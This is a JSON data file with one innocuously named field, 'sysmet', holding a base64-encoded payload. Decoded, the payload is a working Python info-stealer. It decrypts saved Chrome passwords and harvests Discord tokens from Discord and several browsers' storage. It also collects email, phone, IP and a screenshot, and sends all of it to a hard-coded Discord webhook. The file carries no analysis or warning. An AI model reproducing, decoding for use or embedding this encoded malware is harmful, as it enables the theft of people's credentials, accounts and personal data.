{"sysmet": "aW1wb3J0IHJlCmltcG9ydCBvcwppbXBvcnQganNvbgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGJhc2U2NAppbXBvcnQgd2luMzJjcnlwdApmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwppbXBvcnQgc2h1dGlsCmltcG9ydCBzcWxpdGUzCmZyb20gZGhvb2tzIGltcG9ydCBXZWJob29rLCBGaWxlCmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIKCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpyb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKdGVtcCA9IG9zLmdldGVudignVEVNUCcpCgoKdXJsX3dlYmhvb2sgPSAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODMxODI3NDIyODA2NTQwMzA4Lzl5YjdXVVJXcEJ1V0EySmRzRS1hb3BFTHk4WEJGSks2ekdfSldvNlVtUzFTREJMMVlrVG5aOVRDckRlemtvUnZmOUVKJwpkZWYgZ2V0X21hc3Rlcl9rZXkocGF0aF9zdGF0ZSk6CiAgICB3aXRoIG9wZW4ocGF0aF9zdGF0ZSwgInIiLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgIGxvY2FsX3N0YXRlID0gZi5yZWFkKCkKICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZHMobG9jYWxfc3RhdGUpCiAgICBtYXN0ZXJfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgbWFzdGVyX2tleSA9IG1hc3Rlcl9rZXlbNTpdCiAgICBtYXN0ZXJfa2V5ID0gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgIHJldHVybiBtYXN0ZXJfa2V5CgoKZGVmIGRlY3J5cHRfcGF5bG9hZChjaXBoZXIsIHBheWxvYWQpOgogICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCgoKZGVmIGdlbmVyYXRlX2NpcGhlcihhZXNfa2V5LCBpdik6CiAgICByZXR1cm4gQUVTLm5ldyhhZXNfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQoKZGVmIGRlY3J5cHRfcGFzc3dvcmQoYnVmZiwgbWFzdGVyX2tleSk6CiAgICB0cnk6CiAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgIGNpcGhlciA9IGdlbmVyYXRlX2NpcGhlcihtYXN0ZXJfa2V5LCBpdikKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRfcGF5bG9hZChjaXBoZXIsIHBheWxvYWQpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiAiQ2hyb21lIDwgODAiCgpwYXRoc19zdGF0ZSA9IHsKICAgICdHb29nbGUgQ2hyb21lJzogbG9jYWwgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZScKfQoKZm9yIHBsYXRmb3JtX2xvbCwgcGF0aF9sb2wgaW4gcGF0aHNfc3RhdGUuaXRlbXMoKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoX2xvbCk6CiAgICAgICAgY29udGludWUKICAgIG1hc3Rlcl9rZXkgPSBnZXRfbWFzdGVyX2tleShwYXRoX2xvbCkKCnBhdGhzX2Nocm9tZSA9IHsKICAgICdHb29nbGUgQ2hyb21lJzogbG9jYWwgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2dpbiBEYXRhJywKICAgICdHb29nbGUgQ2hyb21lMic6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAxXFxMb2dpbiBEYXRhJywKICAgICdHb29nbGUgQ2hyb21lMyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAyXFxMb2dpbiBEYXRhJywKICAgICdHb29nbGUgQ2hyb21lNCc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAzXFxMb2dpbiBEYXRhJywKICAgICdHb29nbGUgQ2hyb21lNSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA0XFxMb2dpbiBEYXRhJywKICAgICdHb29nbGUgQ2hyb21lNic6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA1XFxMb2dpbiBEYXRhJywKICAgICdHb29nbGUgQ2hyb21lNyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA2XFxMb2dpbiBEYXRhJwogICAgfQoKZm9yIHBsYXRmb3JtX2xvbCwgcGF0aF9tZHIgaW4gcGF0aHNfY2hyb21lLml0ZW1zKCk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aF9tZHIpOgogICAgICAgIGNvbnRpbnVlCiAgICBzaHV0aWwuY29weTIocGF0aF9tZHIsIHRlbXAgKyAiTG9naW52YXVsdC5kYiIpCiAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KHRlbXAgICsgIkxvZ2ludmF1bHQuZGIiKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQoKCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucyIpCiAgICBmaWxlX2dyYWIgPSBvcGVuKGxvY2FsICsgJ1xcR29vZ2xlXFxQYXNzd29yZF9DaHJvbWUudHh0JywgJ3cnKQogICAgZm9yIHIgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgdXJsID0gclswXQogICAgICAgIHVzZXJuYW1lID0gclsxXQogICAgICAgIGVuY3J5cHRlZF9wYXNzd29yZCA9IHJbMl0KICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBkZWNyeXB0X3Bhc3N3b3JkKGVuY3J5cHRlZF9wYXNzd29yZCwgbWFzdGVyX2tleSkKICAgICAgICBmaWxlX2dyYWIud3JpdGUoZiJVUkw6IHt1cmx9XG5Vc2VyIE5hbWU6IHt1c2VybmFtZX1cblBhc3N3b3JkOiB7ZGVjcnlwdGVkX3Bhc3N3b3JkfSIgKyAiXG4iICsgIioiICogNTAgKyAiXG4iKQogICAgZmlsZV9ncmFiLmNsb3NlKCkKCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICB0cnk6CiAgICAgICAgb3MucmVtb3ZlKHRlbXAgKyAiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwoKcGF0aHMgPSB7CiAgICAnRGlzY29yZCc6IHJvYW1pbmcgKyAnXFxEaXNjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdEaXNjb3JkIFBUQic6IHJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdHb29nbGUgQ2hyb21lJzogbG9jYWwgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdHb29nbGUgQ2hyb21lMic6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAxXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdHb29nbGUgQ2hyb21lMyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAyXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdHb29nbGUgQ2hyb21lNCc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAzXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdHb29nbGUgQ2hyb21lNSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdHb29nbGUgQ2hyb21lNic6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA1XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdHb29nbGUgQ2hyb21lNyc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA2XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdCcmF2ZTEnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSAxXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdCcmF2ZTInOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSAyXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdCcmF2ZTMnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSAzXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdCcmF2ZTQnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSA0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdCcmF2ZTUnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSA1XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdCcmF2ZTYnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSA2XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdZYW5kZXgnOiBsb2NhbCArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdZYW5kZXgxJzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSAxXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdZYW5kZXgyJzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSAyXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdZYW5kZXgzJzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSAzXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdZYW5kZXg0JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSA0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdZYW5kZXg1JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSA1XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJywKICAgICdZYW5kZXg2JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcUHJvZmlsZSA2XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJwp9CgoKZGVmIGZpbmRfdG9rZW4ocGF0aCk6CiAgICB0b2tlbnMgPSBbXQoKICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyJ1tcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI3fScsIHInbWZhXC5bXHctXXs4NH0nKToKICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgICAgICAgICAgICAgIGxpc3RfdG9rZW5zLmFwcGVuZCh0b2tlbikKICAgIAogICAgcmV0dXJuIHRva2VucwoKbGlzdF90b2tlbnMgPSBbXQpkZWYgZ3JhYl9hbGwodG9rZW4pOgogICAgdG9rZW5pbmZvID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OC91c2Vycy9AbWUnLCBoZWFkZXJzPXsnYXV0aG9yaXphdGlvbic6IHRva2VufSkuanNvbigpCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OC91c2Vycy9AbWUnLCBoZWFkZXJzPXsnYXV0aG9yaXphdGlvbic6IHRva2VufSkKICAgIGlmIHIuc3RhdHVzX2NvZGUgIT0gMjAwOgogICAgICAgIHJldHVybgogICAgaXBpbmZvID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vaXAtYXBpLmNvbS9qc29uLycpLmpzb24oKQogICAgbml0cm9fdHlwZSA9IGpzb24ubG9hZHMoci5jb250ZW50KQogICAgdHJ5OgogICAgICAgIG5pdHJvX3R5cGVbJ3ByZW1pdW1fdHlwZSddCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIGRuaXRybyA9ICJOb24iCiAgICBlbHNlOgogICAgICAgIGlmIG5pdHJvX3R5cGVbJ3ByZW1pdW1fdHlwZSddID09IDE6CiAgICAgICAgICAgIGRuaXRybyA9ICJOaXRybyBDbGFzc2ljIgogICAgICAgIGVsaWYgbml0cm9fdHlwZVsncHJlbWl1bV90eXBlJ10gPT0gMjoKICAgICAgICAgICAgZG5pdHJvID0gIk5pdHJvIEJvb3N0IgogICAgcGF5bG9hZCA9IHsKICAgICAgICAiZW1iZWRzIjogW3sKICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICJuYW1lIjogZiJ7dG9rZW5pbmZvWyd1c2VybmFtZSddfSN7dG9rZW5pbmZvWydkaXNjcmltaW5hdG9yJ119IiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6IGYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97dG9rZW5pbmZvWydpZCddfS97dG9rZW5pbmZvWydhdmF0YXInXX0uanBnIgogICAgICAgICAgICB9LAogICAgICAgICAgICAiZmllbGRzIjogW3sKICAgICAgICAgICAgICAgICJuYW1lIjogIioqSW5mb3MgRGlzY29yZCoqIiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiSUQ6IHt0b2tlbmluZm9bJ2lkJ119XG5FbWFpbDoge3Rva2VuaW5mb1snZW1haWwnXX1cbk51belybyBkZSB06WzpcGhvbmU6IHt0b2tlbmluZm9bJ3Bob25lJ119XG5OaXRybzoge2RuaXRyb31cblRva2VuOiB7dG9rZW59IgogICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIioqQXV0cmVzIGluZm9zKioiLAogICAgICAgICAgICAgICAgInZhbHVlIjogZiJOb20gZHUgUEM6IHtvcy5nZXRlbnYoJ0NPTVBVVEVSTkFNRScpfVxuTm9tIGRlIHNlc3Npb246IHtvcy5nZXRsb2dpbigpfVxuSVA6IHtpcGluZm9bJ3F1ZXJ5J119IgogICAgICAgICAgICB9XQogICAgICAgIH1dCiAgICB9CiAgICByZXF1ZXN0cy5wb3N0KHVybF93ZWJob29rLCBqc29uPXBheWxvYWQpCiAgICBob29rID0gV2ViaG9vayh1cmxfd2ViaG9vaykKICAgIHNjcmVlbiA9IEltYWdlR3JhYi5ncmFiKCkKICAgIHNjcmVlbi5zYXZlKGxvY2FsICsgJ1xcc2NyZWVuLnBuZycpCiAgICBzY3JlZW4uY2xvc2UoKQogICAgaG9vay5zZW5kKGZpbGU9RmlsZShsb2NhbCArICJcXHNjcmVlbi5wbmciKSkKICAgIG9zLnJlbW92ZShsb2NhbCArICdcXHNjcmVlbi5wbmcnKQogICAgd2l0aCBvcGVuKGxvY2FsICsgJ1xcR29vZ2xlXFxQYXNzd29yZF9DaHJvbWUudHh0JywgJ3InKSBhcyBmcDoKICAgICAgICBob29rLnNlbmQoZmlsZT1GaWxlKGZwLCBuYW1lPWYiUGFzc3dvcmRzX0Nocm9tZV97dG9rZW5pbmZvWyd1c2VybmFtZSddfS50eHQiKSkKCmZvciBwbGF0Zm9ybV9sb2wsIHBhdGggaW4gcGF0aHMuaXRlbXMoKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICBjb250aW51ZQoKICAgIHRva2VucyA9IGZpbmRfdG9rZW4ocGF0aCkKICAgIGlmIGxlbih0b2tlbnMpID4gMDoKICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICBncmFiX2FsbCh0b2tlbik="}
